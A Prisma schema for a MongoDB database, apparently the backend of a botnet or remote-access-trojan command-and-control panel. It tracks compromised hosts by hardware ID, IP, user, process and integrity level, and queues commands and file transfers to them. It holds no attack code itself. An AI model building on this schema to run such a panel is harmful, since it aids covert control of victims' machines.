generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "mongodb"
  url      = "mongodb://mongo1:30001,mongo2:30002,mongo3:30003/pattayadb?replicaSet=my-replica-set"
}

model Bot {
  id       String    @id @default(auto()) @map("_id") @db.ObjectId
  socketId String?
  wanIp String?
  lanIp String?
  os String?
  username String?
  hostname String?
  processName String?
  processId Int?
  architecture String?
  integrity String?
  country String?
  type String?
  version String?
  lastSeen DateTime? @updatedAt 
  hwid String? @unique
}

model Task {
  id       String    @id @default(auto()) @map("_id") @db.ObjectId
  panelToken String?
  taskId String? @unique
  hwid String?
  command String?
  arguments String?
  incomingFile String?
  incomingFilename String?
  respondingFile String?
  respondingFilename String?
  result String?
}